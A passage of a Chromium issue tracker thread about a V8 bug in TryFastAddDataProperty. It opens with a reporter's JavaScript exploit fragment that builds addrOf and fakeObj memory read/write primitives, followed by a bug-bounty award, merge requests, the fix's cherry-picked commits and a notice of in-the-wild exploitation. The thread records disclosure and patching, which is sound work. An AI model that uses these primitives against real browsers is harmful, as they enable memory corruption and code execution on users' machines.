    TryFastAddDataProperty() found map transition: MapA----(AA, kData, SMI)--->MapB
    However, `object->WriteToField(descriptor, details, *value);` still uses the stale descriptor
*/
value = 1.1;
let o2 = new C("'use strict'");



/* 
    Memory layout after the bug triggers:
    `JSObject::WriteToField(...)` writes the `HeapNumber(1.1)` pointer into
    `evilArr`'s `JSArray::elements` field.
    As a result, `HeapNumber(1.1)` is treated as a `FixedDoubleArray`, enabling
    limited arbitrary memory read/write.
    The `HeapNumber(1.1)` object is followed by the `NameDictionary` of `o2->properties`,
    so reading/writing `NameDictionary` entries through `evilArr` implements fakeObj and addrOf.
*/
let evilArr = o2[F122];

// %DebugPrint(evilArr);


// evilArr[15] as float64 overlaps with o2["F92"]'s NameDictionary::Entry in memory

// Read Entry::key address first to prevent corruption during subsequent writes
f64[0] = evilArr[15];
const key_F92_addr = u32[0];

function addrOf(obj) {
    // Write the object pointer into the NameDictionary entry
    o2["F92"] = obj;
    // Read it back as a float64
    f64[0] = evilArr[15];
    return u32[1];
}

function fakeObj(addr) {
    // Overwrite the NameDictionary::Entry with our crafted pointer
    u32[0] = key_F92_addr;
    u32[1] = addr;
    evilArr[15] = f64[0];
    // Read the entry back as an object reference
    return o2["F92"];
}


print(addrOf("AAA"));


```

### hu...@gmail.com (2026-05-06)

This exploit has been tested on V8 CTF. The addrOf and fakeObj primitives both work well. However, I was unable to find a 1-day for V8 heap sandbox escape, which is frustrating. I have no choice but to give up :-(

### sp...@google.com (2026-05-13)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
High quality. Renderer RCE / memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-20)

Requesting merge to M148 because latest trunk commit is in 150.

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Requesting merge to M149 because latest trunk commit is in 150.

### ch...@google.com (2026-05-20)

**M148** merge request created. **Please update [crbug/514925552](https://crbug.com/514925552) to have this merge reviewed.**

### ch...@google.com (2026-05-20)

**M149** merge request created. **Please update [crbug/514929354](https://crbug.com/514929354) to have this merge reviewed.**

### dx...@google.com (2026-06-05)

Project: v8/v8  

Branch:  refs/branch-heads/14.8  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7874712>

[M148] [objects] Abort TryFastAddDataProperty if map becomes slow

---


Expand for full commit details
```
     
    Original change's description: 
    > [objects] Abort TryFastAddDataProperty if map becomes slow 
    > 
    > When class fields are added to a constructor-created function object 
    > when the class extends Function, TryFastAddDataProperty is invoked 
    > to perform a fast transition. However, Map::PrepareForDataProperty may 
    > instead normalize the map and return a slow dictionary map. 
    > 
    > This CL fixes the issue by aborting the fast transition in 
    > TryFastAddDataProperty and returning false if 
    > Map::PrepareForDataProperty returns a dictionary map, falling back 
    > to the standard slow property addition path. 
    > 
    > TAG=agy 
    > CONV=7233c224-ccbc-421c-88b3-34be1f425294 
    > 
    > Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
    > Fixed: 506689381 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7807043 
    > Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    > Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    > Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#107009} 
     
    (cherry picked from commit 3c869652b039fc1fc9fbe035c6af879317e8b9f3) 
     
    Bug: 514925552,506689381 
    Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7874712 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.8@{#62} 
    Cr-Branched-From: f9659283a5f8d42b3c09228cf5df606fcaf47a3d-refs/heads/14.8.178@{#1} 
    Cr-Branched-From: 141232520dc4910401240c531db3af36910a0fd1-refs/heads/main@{#106240}

```

---

Files:

- M `src/objects/js-objects.cc`
- A `test/mjsunit/regress/regress-crbug-506689381.js`

---

Hash: [c6bfbe7c4e8449e68b86663d2ab2d1f14447f809](https://chromiumdash.appspot.com/commit/c6bfbe7c4e8449e68b86663d2ab2d1f14447f809)  

Date: Mon May 4 10:27:58 2026


---

### dx...@google.com (2026-06-05)

Project: v8/v8  

Branch:  refs/branch-heads/14.9  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7863305>

[M149] [objects] Abort TryFastAddDataProperty if map becomes slow

---


Expand for full commit details
```
     
    Original change's description: 
    > [objects] Abort TryFastAddDataProperty if map becomes slow 
    > 
    > When class fields are added to a constructor-created function object 
    > when the class extends Function, TryFastAddDataProperty is invoked 
    > to perform a fast transition. However, Map::PrepareForDataProperty may 
    > instead normalize the map and return a slow dictionary map. 
    > 
    > This CL fixes the issue by aborting the fast transition in 
    > TryFastAddDataProperty and returning false if 
    > Map::PrepareForDataProperty returns a dictionary map, falling back 
    > to the standard slow property addition path. 
    > 
    > TAG=agy 
    > CONV=7233c224-ccbc-421c-88b3-34be1f425294 
    > 
    > Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
    > Fixed: 506689381 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7807043 
    > Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    > Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    > Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#107009} 
     
    (cherry picked from commit 3c869652b039fc1fc9fbe035c6af879317e8b9f3) 
     
    Bug: 514929354,506689381 
    Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7863305 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.9@{#52} 
    Cr-Branched-From: 8f08364a351ad38a60421137a09ef23953ecdd56-refs/heads/14.9.207@{#1} 
    Cr-Branched-From: 8de67b11924d5e8c0032029165a52d800cf05f1f-refs/heads/main@{#106999}

```

---

Files:

- M `src/objects/js-objects.cc`
- A `test/mjsunit/regress/regress-crbug-506689381.js`

---

Hash: [346c5c56a657a35d8c0e11c9463aeea7d83b857b](https://chromiumdash.appspot.com/commit/346c5c56a657a35d8c0e11c9463aeea7d83b857b)  

Date: Mon May 4 10:27:58 2026


---

### pe...@google.com (2026-06-05)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### cl...@google.com (2026-06-05)

We have evidence that this vulnerability is currently being exploited in the wild as a zero-day against Chrome stable (149.0.7827.54).

### dx...@google.com (2026-06-05)

Project: v8/v8  

Branch:  chromium/7827\_48  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7904032>

[M149] [objects] Abort TryFastAddDataProperty if map becomes slow

---


Expand for full commit details
```
     
    Original change's description: 
    > [objects] Abort TryFastAddDataProperty if map becomes slow 
    > 
    > When class fields are added to a constructor-created function object 
    > when the class extends Function, TryFastAddDataProperty is invoked 
    > to perform a fast transition. However, Map::PrepareForDataProperty may 
    > instead normalize the map and return a slow dictionary map. 
    > 
    > This CL fixes the issue by aborting the fast transition in 
    > TryFastAddDataProperty and returning false if 
    > Map::PrepareForDataProperty returns a dictionary map, falling back 
    > to the standard slow property addition path. 
    > 
    > TAG=agy 
    > CONV=7233c224-ccbc-421c-88b3-34be1f425294 
    > 
    > Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
    > Fixed: 506689381 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7807043 
    > Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    > Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    > Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#107009} 
     
    (cherry picked from commit 3c869652b039fc1fc9fbe035c6af879317e8b9f3) 
     
    Bug: 514929354,506689381 
    Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7863305 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.9@{#52} 
    Cr-Branched-From: 8f08364a351ad38a60421137a09ef23953ecdd56-refs/heads/14.9.207@{#1} 
    Cr-Branched-From: 8de67b11924d5e8c0032029165a52d800cf05f1f-refs/heads/main@{#106999} 
    (cherry picked from commit 346c5c56a657a35d8c0e11c9463aeea7d83b857b) 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7904032 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: Harry Souders <harrysouders@google.com> 
    Owners-Override: Harry Souders <harrysouders@google.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com>

```

---

Files:

- M `src/objects/js-objects.cc`
- A `test/mjsunit/regress/regress-crbug-506689381.js`

---

Hash: [c1a88eda3f946eddcf21b9b0264751d1f4a8789e](https://chromiumdash.appspot.com/commit/c1a88eda3f946eddcf21b9b0264751d1f4a8789e)  

Date: Mon May 4 10:27:58 2026


---

### ch...@google.com (2026-07-20)

**M144** merge request created. **Please update [crbug/536685575](https://crbug.com/536685575) to have this merge reviewed.**

### dx...@google.com (2026-07-22)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/8132958>

[M144] [objects] Abort TryFastAddDataProperty if map becomes slow

---


Expand for full commit details
```
[M144] [objects] Abort TryFastAddDataProperty if map becomes slow 
 
Original change's description: 
> [objects] Abort TryFastAddDataProperty if map becomes slow 
> 
> When class fields are added to a constructor-created function object 
> when the class extends Function, TryFastAddDataProperty is invoked 
> to perform a fast transition. However, Map::PrepareForDataProperty may 
> instead normalize the map and return a slow dictionary map. 
> 
> This CL fixes the issue by aborting the fast transition in 
> TryFastAddDataProperty and returning false if 
> Map::PrepareForDataProperty returns a dictionary map, falling back 
> to the standard slow property addition path. 
> 
> TAG=agy 
> CONV=7233c224-ccbc-421c-88b3-34be1f425294 
> 
> Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
> Fixed: 506689381 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7807043 
> Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
> Reviewed-by: Igor Sheludko <ishell@chromium.org> 
> Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#107009} 
 
(cherry picked from commit 3c869652b039fc1fc9fbe035c6af879317e8b9f3) 
 
Bug: 536685575,506689381 
Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/8132958 
Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Olivier Flückiger <olivf@chromium.org> 
Cr-Commit-Position: refs/branch-heads/14.4@{#111} 
Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/objects/js-objects.cc`
- A `test/mjsunit/regress/regress-crbug-506689381.js`

---

Hash: [4654e376ae47638c055cb8138d94e69877d543ac](https://chromiumdash.appspot.com/commit/4654e376ae47638c055cb8138d94e69877d543ac)  

Date: Mon May 4 10:27:58 2026


---

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/506689381)*
